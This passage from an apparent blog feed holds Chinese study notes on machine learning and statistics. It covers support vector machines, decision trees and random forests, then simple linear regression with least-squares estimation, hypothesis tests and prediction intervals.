经过组合可解决多分类问题.</li><li>特征空间上的<strong>间隔最大化线性分类器</strong>.</li><li>通过<strong>核技巧</strong>可实现<strong>非线性分类</strong>.</li><li>根据模型的复杂程度划分.</li></ul></li><li><p><strong>线性可分支持向量机</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008767.png" alt=""></p><p>  通过<strong>间隔最大化</strong>得到分类超平面:</p><script type="math/tex; mode=display">  w^*\cdot x+b^*=0.</script><p>  相应的决策函数:</p><script type="math/tex; mode=display">  f(x)=sign(w^*\cdot x+b^*).</script><p>  <strong>函数间隔</strong>:</p><script type="math/tex; mode=display">  \hat\gamma_i=y_i(w\cdot x_i+b)\Rightarrow\hat\gamma=\min_{i}\hat\gamma_i.</script><p>  <strong>几何间隔</strong>:</p><script type="math/tex; mode=display">  \gamma_i=y_i(\dfrac{w}{\Vert w\Vert}\cdot x_i+\dfrac{b}{\Vert w\Vert})\Rightarrow\gamma=\min_{i}\gamma_i.</script><p>  <strong>间隔最大化</strong>问题:</p><script type="math/tex; mode=display">  \max_{w,b}\gamma\quad s.t.\quad y_i(\dfrac{w}{\Vert w\Vert}\cdot x_i+\dfrac{b}{\Vert w\Vert})\ge\gamma,\,1\le i\le N.</script><p>  转化为<strong>凸二次规划问题</strong>:</p><script type="math/tex; mode=display">  \min_{w,b}\dfrac{1}{2}\Vert w\Vert^2\quad s.t.\quad y_i(w\cdot x_i+b)\ge 1,\,1\le i\le N.</script><p>  定义<strong>拉格朗日函数</strong>:</p><script type="math/tex; mode=display">  L(w,b,\alpha)=\dfrac{1}{2}\Vert w\Vert^2+\sum_{i=1}^{N}\alpha_i[1-y_i(w\cdot x_i+b)],\,\alpha_i\ge 0,\,1\le i\le N.</script><p>  下列命题与原命题<strong>等价</strong>:</p><script type="math/tex; mode=display">  \min_{w,b}\max_{\alpha}L(w,b,\alpha).</script><p>  满足<strong>KKT</strong>条件时, <strong>对偶命题</strong>与原命题<strong>等价</strong>:</p><script type="math/tex; mode=display">  \min_{w,b}\max_{\alpha}L(w,b,\alpha)=\max_{\alpha}\min_{w,b}L(w,b,\alpha).</script><p>  对 $w, b$ 求偏导令其为 0 并代入, 得到<strong>对偶问题</strong>:</p><script type="math/tex; mode=display">  \min_{\alpha}\Big(\dfrac{1}{2}\sum_{i=1}^{N}\sum_{j=1}^{N}\alpha_i\alpha_jy_iy_j(x_i\cdot x_j)-\sum_{i=1}^{N}\alpha_i\Big)\quad s.t.\quad \sum_{i=1}^{N}\alpha_iy_i=0.</script><p>  获得 $w^<em>,b^</em>$:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008768.png" alt=""></p><p>  <strong>与 $\alpha_i&gt;0$ 对应的实例 $x_i$ 就是支持向量.</strong></p></li><li><p><strong>线性支持向量机</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008769.png" alt=""></p><p>  转化为<strong>凸二次规划</strong>问题:</p><script type="math/tex; mode=display">  \min_{w,b}(\dfrac{1}{2}\Vert w\Vert^2+C\sum_{i=1}^{N}\xi_i)\quad s.t.\quad y_i(w\cdot x_i+b)\ge 1-\xi_i,\,1\le i\le N.</script><p>  得到<strong>对偶问题</strong>:</p><script type="math/tex; mode=display">  \min_{\alpha}\Big(\dfrac{1}{2}\sum_{i,j=1}^{N}\alpha_i\alpha_jy_iy_j(x_i\cdot x_j)-\sum_{i=1}^{N}\alpha_i\Big)\, s.t.\,0\le\alpha_i\le C, \sum_{i=1}^{N}\alpha_iy_i=0.</script><p>  获得 $w^<em>,b^</em>$:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008770.png" alt=""></p><p>  <strong>与 $\alpha_i&gt;0$ 对应的实例 $x_i$ 就是支持向量.</strong></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008771.png" alt=""></p></li><li><p><strong>非线性支持向量机</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008772.png" alt=""></p><p>  利用<strong>变换</strong>:</p><script type="math/tex; mode=display">  z=\phi(x)=((x^{(1)})^2,(x^{(2)})^2)^T.</script><p>  将原空间的椭圆:</p><script type="math/tex; mode=display">  w_1(x^{(1)})^2+w_2(x^{(2)})^2+b=0</script><p>  变换为新空间的直线:</p><script type="math/tex; mode=display">  w_1z^{(1)}+w_2z^{(2)}+b=0.</script><p>  通过一个<strong>非线性变换</strong>将<strong>输入空间 $X$</strong> 对应于一个<strong>特征空间 $H$</strong> 使, 得在输入空间 $X$ 的<strong>超曲面模型</strong>对应于特征空间 $H$ 中的<strong>超平面模型</strong>. 分类问题的学习就可以通过<strong>在 $H$ 空间中求解线性支持向量机</strong>完成.</p><p>  得到对偶问题:</p><script type="math/tex; mode=display">  \min_{\alpha}\Big(\dfrac{1}{2}\sum_{i,j=1}^{N}\alpha_i\alpha_jy_iy_jK(x_i,x_j)-\sum_{i=1}^{N}\alpha_i\Big) s.t.\,0\le\alpha_i\le C, \sum_{i=1}^{N}\alpha_iy_i=0.</script><p>  常见<strong>核函数</strong>为:</p><ul><li><p>内积核函数</p><script type="math/tex; mode=display">K(x,z)=(x\cdot z)^2.</script></li><li><p>多项式核函数</p><script type="math/tex; mode=display">K(x,z)=(x\cdot z+1)^p.</script></li><li><p>高斯核函数</p><ul><li><strong>$\sigma$ 过大: 欠拟合;</strong></li><li><strong>$\sigma$ 恰当: 恰拟合;</strong></li><li><strong>$\sigma$ 过小: 过拟合.</strong></li></ul><script type="math/tex; mode=display">K(x,z)=\exp\big(-\dfrac{\Vert x-z\Vert^2}{2\sigma^2}\big).</script><p>得到<strong>最终对偶问题</strong>:</p><script type="math/tex; mode=display">\min_{\alpha}\Big(\dfrac{1}{2}\sum_{i,j=1}^{N}\alpha_i\alpha_jy_iy_jK(x_i,x_j)-\sum_{i=1}^{N}\alpha_i\Big)\, s.t.\,\alpha_i\le C, \sum_{i=1}^{N}\alpha_iy_i=0.</script><p>获得 $w^<em>,b^</em>$:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008773.png" alt=""></p><p>其中 <strong>$w$ 无法直接得到</strong>, 此时情况为<strong>超曲面</strong>.</p></li></ul></li><li><p><strong>序列最小最优化算法 SMO</strong>:</p><ul><li>支持向量机的学习问题是一个<strong>凸二次规划问题</strong>, 具有<strong>全局最优解</strong>.</li><li>是一种<strong>快速算法</strong>.</li></ul></li><li><p><strong>SVM</strong>求解<strong>多类问题</strong>:</p><ul><li><strong>一对多</strong>: <strong>某类为正例, 其余类为负例</strong>. 分类时将未知样本分类为具有最大分类函数值的那类 (<strong>样本不均衡</strong>).</li><li><strong>一对一</strong>: <strong>任两类构造</strong> <strong>SVM</strong>, 采取<strong>投票法</strong>决定类别 (效果好、数量大).</li><li><strong>层次法</strong>: 所有类<strong>先分成两类</strong>, <strong>每类再分为两类</strong>, 以此类推.</li></ul></li></ul><h2 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h2><ul><li><p>对实例分类的树形结构. <strong>内部</strong>节点表示一个<strong>特征或属性</strong>, <strong>叶</strong>节点表示一个<strong>类</strong>.</p></li><li><p><strong>决策树学习</strong>:</p><ul><li>从训练集归纳出分类规则, 得到与训练集矛盾较小的决策树.</li><li>对给定训练集, 可构造多个决策树, 以损失函数最小化作为优化目标.</li><li>选取<strong>最优决策树</strong>是一个 <strong>NPC</strong> 问题, 一般采用启发式方法得到近似解.</li></ul></li><li><p><strong>决策树学习</strong>——<strong>特征选择</strong>:</p><ul><li><p>按照<strong>信息增益</strong>选择特征.</p></li><li><p><strong>熵</strong>表示数据的混乱程度, <strong>条件熵</strong>表示已知条件下数据的不确定性.</p><ul><li><p>随机变量 $X$ 的<strong>熵</strong>:</p><script type="math/tex; mode=display">  H(X)=-\sum_{i=1}^{n}p_i\log p_i.</script><p>  当条件由数据集 $D$ 估计得到时, 记为 $H(D)$.</p></li><li><p><strong>条件熵</strong>:</p><script type="math/tex; mode=display">  H(Y\mid X)=\sum_{i=1}^{n}p_iH(Y\mid X=x_i).</script><p>  表示已知 $X$ 时 $Y$ 的不确定性.</p></li></ul></li><li><p><strong>信息增益</strong>是特征 <strong>A</strong> 对数据集 <strong>D</strong> 进行分类不确定性的减少程度.</p><script type="math/tex; mode=display">  g(D,A)=H(D)-H(D\mid A).</script><p>  <strong>信息增益大</strong>的特征具有<strong>更强的分类能力</strong>.</p></li><li><p>设<strong>训练集</strong> $D$, $K$ 个<strong>类</strong> $C_k$, <strong>特征</strong> $A$ 有 $n$ 个不同的取值 $\{a_1,\cdots,a_n\}$. $A$ 的<strong>不同取值</strong>将 $D$ 划分为 $n$ 个子集 $D_1$, $\cdots$, $D_n$, $D_i$ 中<strong>属于类</strong> $C_k$ 的<strong>样本</strong>的集合为 $D_{ik}$, $\vert\cdot\vert$ 表示<strong>样本个数</strong>. 计算<strong>信息增益</strong>:</p><script type="math/tex; mode=display">  H(D)=-\sum_{k=1}^{K}\dfrac{\vert C_k\vert}{\vert D\vert}\log_2\dfrac{\vert C_k\vert}{\vert D\vert}.\\  H(D\mid A)=\sum_{i=1}^{n}\dfrac{\vert D_i\vert}{\vert D\vert}H(D_i)=-\sum_{i=1}^{n}\dfrac{\vert D_i\vert}{\vert D\vert}\sum_{k=1}^{K}\dfrac{\vert D_{ik}\vert}{\vert D_i\vert}\log_2\dfrac{\vert D_{ik}\vert}{\vert D_i\vert}.</script></li></ul></li><li><p><strong>决策树学习</strong>——<strong>决策树的生成</strong>:</p><ul><li><p><strong>ID3 算法</strong>:</p><ul><li>输入: <strong>训练集</strong> $D$, <strong>特征集</strong> $A$, 阈值 $\varepsilon$ &gt;0.</li><li>输出: <strong>决策树</strong> $T$.</li></ul><ol><li>若 $D$ 中所有实例<strong>属于同一类</strong> $C_k$, 则 $T$ 为<strong>单节点树</strong>, $C_k$ 为<strong>该节点类标记</strong>, 返回 $T$.</li><li>若 $A$ 为<strong>空</strong>, 则 $T$ 为<strong>单节点树</strong>, $D$ 中<strong>实例数最大</strong>的类 $C_k$ 为<strong>该节点类标记</strong>, 返回 $T$.</li><li>否则计算 $A$ 中<strong>各特征</strong>对 $D$ 的<strong>信息增益</strong>. 选择<strong>最大的特征</strong> $A_g$.</li><li>如果 $A_g$ <strong>信息增益小于阈值</strong>, 则置 $T$ 为<strong>单节点树</strong>, 将 $D$ 中<strong>实例数最大</strong>的类 $C_k$ 作为<strong>该节点类标记</strong>, 返回 $T$.</li><li>否则对 $A_g$ 的<strong>每一可能值</strong> $a_i$, 依 $A_g=a_i$ 将<strong>分割</strong>为 $D$ 若干子集 $D_i$, 作为 $D$ 的<strong>子节点</strong>.</li><li>对于 $D$ 的每个<strong>子节点</strong> $D_i$, 如果 $D_i$ <strong>为空</strong>, 则将 $D$ 中<strong>实例数最大</strong>的类作为<strong>标记</strong>, 构建子节点.</li><li>否则以 $D_i$ 为<strong>训练集</strong>, 以 $A-\{A_g\}$为<strong>特征集</strong>, <strong>递归地调用</strong>得到子树 $T_i$, 返回 $T_i$.</li></ol><ul><li><p>不足: <strong>信息增益</strong>倾向于选择<strong>分枝比较多的属性</strong>.</p></li><li><p>解决: <strong>信息增益比</strong>. $A$ 为属性, $A$ 的不同取值将 $D$ 划分为 $n$ 个子集 $D_1$, $\cdots$, $D_n$.</p><script type="math/tex; mode=display">  g_R(D,A)=\dfrac{g(D,A)}{H_A(D)}.\\  H_A(D)=-\sum_{k=1}^{n}\dfrac{\vert D_k\vert}{\vert D\vert}\log_2\dfrac{\vert D_k\vert}{\vert D\vert}.</script></li></ul></li><li><p><strong>C4.5 算法</strong>:</p><ul><li>除了根据信息增益比选择特征外, <strong>C4.5</strong> 算法与 <strong>ID3</strong> 基本一样.</li><li>增加了对<strong>连续值属性</strong>的处理, 对于连续值属性 <strong>A</strong>, 找到一个属性值 $a_0$, 将 $\le a_0$ 的划分到左子树, $＞a_0$ 的划分到右子树.</li><li>不足: <strong>信息增益比</strong>倾向于选择<strong>分割不均匀的特征</strong>, 轻重不均匀.</li><li>解决: 先选择 <strong>n</strong> 个<strong>信息增益大</strong>的特征, 再从这 <strong>n</strong> 个特征中选择<strong>信息增益比最大</strong>的特征.</li></ul></li></ul></li><li><p><strong>决策树学习</strong>——<strong>决策树的剪枝</strong>:</p><ul><li><p>为防止出现<strong>过拟合</strong>, 对决策树进行简化的过程称为<strong>剪枝</strong>. 从已经生成的树上裁掉一些子树或者叶节点, 将其父节点作为新的叶节点, 用<strong>实例数最大的类别作为标记</strong>.</p></li><li><p>这种生成树再剪枝的方法称为<strong>后剪枝</strong>.</p></li><li><p>当<strong>数据量大</strong>时:</p><ul><li>将数据划分为训练集、验证集和测试集.</li><li>用训练集训练得到决策树.</li><li>从下向上逐步剪枝, 在验证集上测试性能, 直到性能下降为止.</li><li>最后在测试集上的性能作为系统的性能.</li></ul></li><li><p>当<strong>数据量小</strong>时:</p><ul><li><p>直接利用训练集进行剪枝.</p></li><li><p>树 $T$ 的<strong>叶节点</strong>个数为 $\vert T\vert$, $t$ 是树 $T$ 的叶节点, 该节点有 $N_t$ 个<strong>样本</strong>, 其中 $k$ 类的<strong>样本点</strong>有 $N_{tk}$ 个 ($k=1,\cdots,K$). $H_t(T)$ 为叶节点 $t$ 上的<strong>经验熵</strong>, $a\ge 0$ 为参数.</p><script type="math/tex; mode=display">  C_a(T)=\sum_{t=1}^{\vert T\vert}N_tH_t(T)+a\vert T\vert.\\  C(T)=\sum_{t=1}^{\vert T\vert}N_tH_t(T)=-\sum_{t=1}^{\vert T\vert}\sum_{k=1}^{K}N_{tk}\log\dfrac{N_{tk}}{N_t}.</script><p>  其中 $C(T)$ 表示对<strong>训练数据的预测误差</strong>, $\vert T\vert$ 表示模型的<strong>复杂程度</strong>.</p></li></ul></li><li><p><strong>剪枝</strong>就是当 $a$ 确定时, 选择损失函数最小的模型.</p><ul><li>输入: 生成算法产生的<strong>整个树</strong> $T$, <strong>参数</strong> $a$.</li><li>输出: 修剪后的<strong>子树</strong> $T_a$.</li></ul><ol><li>计算每个节点的<strong>经验熵</strong>.</li><li><strong>递归</strong>地从树的叶节点<strong>向上回缩</strong>, 如果回缩后的<strong>损失函数</strong>小于等于回缩前, 则<strong>剪枝</strong>将父节点变为新的叶节点.</li><li><strong>返回 2</strong>, 直至不能继续为止, 得到<strong>损失函数最小</strong>的子树 $T_a$.</li></ol></li></ul></li><li><p><strong>随机森林</strong>:</p><ul><li>决策树容易过拟合.</li><li>随机森林是由多个决策树组成的分类器.</li><li>通过投票机制改善决策树.</li><li>单个决策树的生成:<ul><li>有放回的数据采样.</li><li>属性 (特征) 的采样.</li></ul></li><li>集外数据的使用:<ul><li>单个决策树未用到的数据.</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> IAI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Introduction to AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记8</title>
      <link href="/2023/05/28/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-8/"/>
      <url>/2023/05/28/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-8/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-8-线性回归"><a href="#Chap-8-线性回归" class="headerlink" title="Chap 8 线性回归"></a>Chap 8 线性回归</h1><h2 id="回归问题"><a href="#回归问题" class="headerlink" title="回归问题"></a>回归问题</h2><ul><li><p><strong>定义</strong>  </p><script type="math/tex; mode=display">  Y=f(X_1,\cdots,X_n)+\varepsilon.</script><ul><li>$Y$ — 因变量(响应变量).</li><li>$X_1,\cdots,X_n$ — 自变量(回归变量).</li><li><p>$\varepsilon$ — 随机误差(无法测量或不重要的因素).</p><p>假定 $E(\varepsilon\mid X_1,\cdots,X_n)=0$,</p><script type="math/tex; mode=display">\Rightarrow E(Y\mid X_1,\cdots,X_n)=f(X_1,\cdots,X_n).</script><p>称为 $Y$ 对 $X_1,\cdots,X_n$ 的回归函数. 由样本数据 $X_1,\cdots,X_n,Y$ 获取 $f$ 的过程称为回归(有监督学习).</p></li></ul></li><li><p><strong>注</strong>  </p><ul><li>$X_1,\cdots,X_n$ 可以是随机的(<strong>e.g.</strong> 随机抽取一人的身高、体重等).</li><li>$X_1,\cdots,X_n$ 也可以是非随机的控制变量(<strong>e.g.</strong> 施肥量、药品使用剂量).</li><li>在应用中, 自变量一律视为非随机的.</li></ul></li><li><p><strong>假设</strong>  $E(\varepsilon)=0$, $Var(\varepsilon)=\sigma^2$ (未知).</p></li><li><p><strong>注</strong>  要素是否完全、$f$ 的形式是否准确关乎 $\sigma^2$ 的大小.</p></li></ul><h2 id="简单线性回归"><a href="#简单线性回归" class="headerlink" title="简单线性回归"></a>简单线性回归</h2><ul><li><p><strong>定义</strong></p><script type="math/tex; mode=display">  Y=\beta_0+\beta_1 X+\varepsilon.</script><p>  这是<strong>理论模型</strong>, 提供背景作用. 其中回归参数(未知待定):</p><ul><li>$\beta_0$ — 截距.</li><li><p>$\beta_1$ — 斜率(回归系数).</p><p>对 $(X,Y)$ 进行 $n$ 次独立观测, 得到样本观测值 $(x_1,y_1),\cdots,(x_n,y_n)$. 则</p><script type="math/tex; mode=display">y_i=\beta_0+\beta_1 x_i+\varepsilon_i\,(1\le i\le n).</script><p>其中 $\varepsilon_i$ 作为第 $i$ 次观测的随机误差, 无法直接观测得到. 不妨认为</p><script type="math/tex; mode=display">\begin{cases}E(\varepsilon_i)=0,\\\\Var(\varepsilon_i)=\sigma^2.\end{cases}</script><p>这是<strong>简单线性回归模型</strong>. 其中:</p></li><li><p>$E(y_i)=\beta_0+\beta_1 x_i$.</p></li><li>$Var(y_i)=\sigma^2$.</li></ul></li><li><p><strong>注</strong></p><ul><li><strong>简单</strong>: $n=1$.</li><li><strong>线性</strong>: $f$ 关于参数 $\beta_0$, $\beta_1$ 线性.</li></ul></li></ul><h2 id="最小二乘法-LS-估计参数"><a href="#最小二乘法-LS-估计参数" class="headerlink" title="最小二乘法 (LS) 估计参数"></a>最小二乘法 (LS) 估计参数</h2><ul><li><p><strong>定义</strong></p><script type="math/tex; mode=display">  S(\beta_0,\beta_1)=\sum_{i=1}^{n}(y_i-(\beta_0+\beta_1 x_i))^2.</script><p>  最小化 $S(\beta_0,\beta_1)$, 得</p><ul><li>$\hat\beta_1=\dfrac{\sum\limits_{i=1}^{n}(x_i-\overline{x})(y_i-\overline{y})}{\sum\limits_{i=1}^{n}(x_i-\overline{x})^2}=\dfrac{\sum\limits_{i=1}^{n}(x_i-\overline{x})y_i}{S_{xx}}$ ($y_i$ 的线性组合).</li><li>$\hat\beta_0=\overline{y}-\hat\beta_1\overline{x}=\sum\limits_{i=1}^{n}(\dfrac{1}{n}-\dfrac{(x_i-\overline{x})\overline{x}}{S_{xx}})y_i$ ($y_i$ 的线性组合).</li><li>$y=\hat\beta_0+\hat\beta_1 x$ (拟合直线).</li></ul></li><li><p><strong>注</strong></p><ul><li>损失函数: $(y-(\beta_0+\beta_1 x))^2$.</li><li>线性模型是否合理.</li></ul></li><li><p><strong>命题</strong>  $\hat\beta_0$, $\hat\beta_1$ 分别为 $\beta_0$, $\beta_1$ 的无偏估计.</p></li><li><p><strong>证明</strong>  </p><script type="math/tex; mode=display">  \begin{aligned}  E(\hat\beta_1)&=\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})E(y_i)}{S_{xx}}\\  &=\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})(\beta_0+\beta_1 x_i)}{S_{xx}}\\  &=\beta_1\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})x_i}{S_{xx}}\\  &=\beta_1\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})^2}{S_{xx}}\\  &=\beta_1.  \end{aligned}</script><script type="math/tex; mode=display">  \begin{aligned}  E(\hat\beta_0)&=E(\overline{y}-\hat\beta_1\overline{x})\\  &=\dfrac{1}{n}\sum_{i=1}^{n}E(y_i)-E(\hat\beta_1)\overline{x}\\  &=\dfrac{1}{n}\sum_{i=1}^{n}(\beta_0+\beta_1 x_i)-\beta_1\overline{x}\\  &=\beta_0.  \end{aligned}</script><script type="math/tex; mode=display">  \begin{aligned}  Var(\hat\beta_1)&=Var\Big(\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})y_i}{S_{xx}}\Big)\\  &=\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})^2}{S_{xx}^2}Var(y_i)\\  &=\dfrac{\sigma^2}{S_{xx}}.  \end{aligned}</script><script type="math/tex; mode=display">  \begin{aligned}  Var(\hat\beta_0)&=Var\Big(\sum\limits_{i=1}^{n}(\dfrac{1}{n}-\dfrac{(x_i-\overline{x})\overline{x}}{S_{xx}})y_i\Big)\\  &=\sum\limits_{i=1}^{n}(\dfrac{1}{n}-\dfrac{(x_i-\overline{x})\overline{x}}{S_{xx}})^2 Var(y_i)\\  &=(\dfrac{1}{n}+\dfrac{\overline{x}^2}{S_{xx}})\sigma^2\\  &=\dfrac{\sigma^2}{S_{xx}}\cdot\dfrac{\sum_{i=1}^{n}x_i^2}{n}.  \end{aligned}</script></li><li><p><strong>注</strong>  中心化处理:</p><script type="math/tex; mode=display">  y_i=\beta_0+\beta_1\overline{x}+\beta_1(x_i-\overline{x})+\varepsilon_i.</script><p>  此时常数项 $\beta_0+\beta_1\overline{x}$ 的估计 $=\hat\beta_0+\hat\beta_1\overline{x}=\overline{y}$.</p></li><li><p><strong>定义(残差)</strong>  当 $X=x_i$ 时, 拟合直线上相应点为 $(x_i,\hat\beta_0+\hat\beta_1 x_i)$.</p><p>  记 $\hat{y}_i=\hat\beta_0+\hat\beta_1 x_i$, 称为 $x_i$ 处的拟合值. 定义残差 $y_i-\hat{y}_i$. 考虑残差平方和</p><script type="math/tex; mode=display">  SSE:=\sum_{i=1}^{n}(y_i-\hat y_i)^2=\sum_{i=1}^{n}(y_i-(\hat\beta_0+\hat\beta_1 x_i))^2.</script></li><li><p><strong>命题</strong>  $\hat\sigma^2:=\dfrac{SSE}{n-2}$ 为 $\sigma^2$ 的无偏估计. 此时</p><ul><li>$\hat{se}(\hat\beta_1)=\dfrac{\hat\sigma}{\sqrt{S_{xx}}}$.</li><li>$\hat{se}(\hat\beta_0)=\hat\sigma\sqrt{\dfrac{1}{n}+\dfrac{\overline{x}^2}{S_{xx}}}$.</li></ul></li></ul><h2 id="回归参数推断"><a href="#回归参数推断" class="headerlink" title="回归参数推断"></a>回归参数推断</h2><ul><li><p><strong>追加假设</strong>  $\varepsilon_i\sim N(0,\sigma^2)$, $1\le i\le n$.</p></li><li><p><strong>注</strong></p><ul><li><p>$y_i\sim N(\beta_0+\beta_1 x_i,\sigma^2)$ 独立, $1\le i\le n$.</p></li><li><p><strong>MLE</strong>$(\beta_0^<em>,\beta_1^</em>)=(\hat\beta_0,\hat\beta_1)$ (<strong>习题课 5</strong>).</p><p>  $L(\beta_0,\beta_1,\sigma^2)=\prod\limits_{i=1}^{n}\dfrac{1}{\sqrt{2\pi}\sigma}e^{-\tfrac{(y_i-(\beta_0+\beta_1 x_i))^2}{2\sigma^2}}$.</p><p>  $(\sigma^2)^*=\dfrac{SSE}{n}$.</p></li></ul></li><li><p><strong>定义(假设检验)</strong>  $H_0:\beta_1=0$ <strong>v.s.</strong> $H_1:\beta_1\ne 0$. 因为 $\hat\beta_1$ 为 $y_i$ 的线性组合. 得到</p><script type="math/tex; mode=display">  \dfrac{\hat\beta_1-\beta_1}{\tfrac{\sigma}{\sqrt{S_{xx}}}}\sim N(0,1)</script><p>  可证明</p><script type="math/tex; mode=display">  \dfrac{SSE}{\sigma^2}=\dfrac{(n-2)\hat\sigma^2}{\sigma^2}\sim\chi^2(n-2).</script><p>  从而</p><script type="math/tex; mode=display">  \dfrac{\hat\beta_1-\beta_1}{\hat{se}(\hat\beta_1)}=\dfrac{\hat\beta_1-\beta_1}{\tfrac{\hat\sigma}{\sqrt{S_{xx}}}}=\dfrac{\hat\beta_1-\beta_1}{\tfrac{\sigma}{\sqrt{S_{xx}}}}/\sqrt{\dfrac{(n-2)\hat\sigma^2}{(n-2)\sigma^2}}\sim t(n-2).</script><p>  检验统计量:</p><script type="math/tex; mode=display">  T=\dfrac{\hat\beta_1}{\hat{se}(\hat\beta_1)}.</script><p>  当 $H_0$ 为真时, $T\sim t(n-2)$. 检验准则为: 当 $\vert T\vert\ge t_{\tfrac{\alpha}{2}}(n-2)$ 时拒绝 $H_0$.</p></li><li><p><strong>注</strong></p><ul><li>可以对其他的 $\beta_1$ 可能值进行检验.</li><li>可以对 $\beta_1$ 进行区间估计.</li><li>可以对 $\beta_0$ 进行相应推断, 过程类似.</li></ul></li></ul><h2 id="预测"><a href="#预测" class="headerlink" title="预测"></a>预测</h2><ul><li><p><strong>例</strong>  当 $X=x_0$ 时, $y_0=\beta_0+\beta_1 x_0+\varepsilon_0$, 其中 $\varepsilon\sim N(0,\sigma^2)$. 令</p><script type="math/tex; mode=display">  \mu_0=E(y_0)=\beta_0+\beta_1 x_0,</script><p>  给出对 $\mu_0$ 的预测.</p></li><li><p><strong>解答</strong>  用拟合直线上 $x_0$ 处的取值 $\hat y_0$ 给出 $\mu_0$ 的点估计:</p><script type="math/tex; mode=display">  \hat y_0=\hat\beta_0+\hat\beta_1x_0=\overline{y}-\hat\beta_1(x_0-\overline{x})=\sum_{i=1}^{n}(\dfrac{1}{n}+\dfrac{(x_i-\overline{x})(x_0-\overline{x})}{S_{xx}})y_i</script><p>  分别给出</p><ul><li>$E(\hat y_0)=E(\hat\beta_0+\hat\beta_1x_0)=\beta_0+\beta_1x_0=\mu_0$.</li><li><p>$Var(\hat y_0)=\sum_{i=1}^{n}\Big(\dfrac{1}{n}+\dfrac{(x_i-\overline{x})(x_0-\overline{x})}{S_{xx}}\Big)^2\sigma^2=\Big(\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}\Big)\sigma^2$.</p><p>从而</p><script type="math/tex; mode=display">\dfrac{\hat y_0-\mu_0}{se(\hat y_0)}\sim N(0,1).</script><p>使用 $\hat{se}(\hat y_0)=\hat\sigma\sqrt{\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}$ 估计 $se(\hat y_0)$, 我们有</p><script type="math/tex; mode=display">\dfrac{\hat y_0-\mu_0}{\hat{se}(\hat y_0)}\sim t(n-2).</script><p>从而 $\mu_0$ 的 $(1-\alpha)-$ 置信的双侧区间估计为</p><script type="math/tex; mode=display">\Big(\hat y_0-t_{\tfrac{\alpha}{2}}\hat\sigma\sqrt{\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}},\hat y_0+t_{\tfrac{\alpha}{2}}\hat\sigma\sqrt{\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}\Big).</script></li></ul></li><li><p><strong>例</strong>  当 $X=x_0$ 时, $y_0=\beta_0+\beta_1 x_0+\varepsilon_0$, 其中 $\varepsilon\sim N(0,\sigma^2)$. 给出对 $y_0$ 的预测.</p></li><li><p><strong>解答</strong>  $y_0\sim N(\mu_0,\sigma^2)$. 若 $\mu_0$ 已知, 则 $y_0$ 的(均方意义下最优)估计为 $\mu_0$.</p><p>  一般情况下, $y_0$ 的良好点估计为 $\hat y_0=\hat\beta_0+\hat\beta_1x_0$.</p><p>  注意到 $y_0$ 与 $\hat y_0$ 相互独立, 从而 $\hat y_0- y_0$ 服从正态分布.</p><p>  分别给出</p><ul><li>$E(\hat y_0-y_0)=E(\hat y_0)-E(y_0)=\mu_0-\mu_0=0$.</li><li><p>$Var(\hat y_0-y_0)=Var(\hat y_0)+Var(y_0)=\sigma^2(1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}})$.</p><p>从而</p><script type="math/tex; mode=display">\dfrac{\hat y_0-y_0}{\sigma\sqrt{1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}}\sim N(0,1).</script><p>进而</p><script type="math/tex; mode=display">\dfrac{\hat y_0-y_0}{\hat\sigma\sqrt{1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}}\sim t(n-2).</script></li></ul></li></ul><pre><code>从而 $y_0$ 的 $(1-\alpha)-$ 置信的双侧区间估计为$$\Big(\hat y_0-t_{\tfrac{\alpha}{2}}\hat\sigma\sqrt{1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}},\hat y_0+t_{\tfrac{\alpha}{2}}\hat\sigma\sqrt{1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}\Big).$$</code></pre><ul><li><p><strong>注</strong>  当 $x_0$ 与 $\overline{x}$ 距离增加时, 估计误差增大.</p></li><li><p><strong>注</strong></p><ul><li>结合实际理解 $\beta$.</li><li>外推需谨慎.</li><li>截距为 0 的回归复杂度 $n-2\rightarrow n-1$.</li><li>回归方程不可逆转使用.</li><li>常见应用:<ul><li>描述趋势.</li><li>预测均值\取值.</li><li>实验控制.</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability &amp; Statistics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记7</title>
      <link href="/2023/05/20/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-7/"/>
      <url>/2023/05/20/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-7/</url>
      
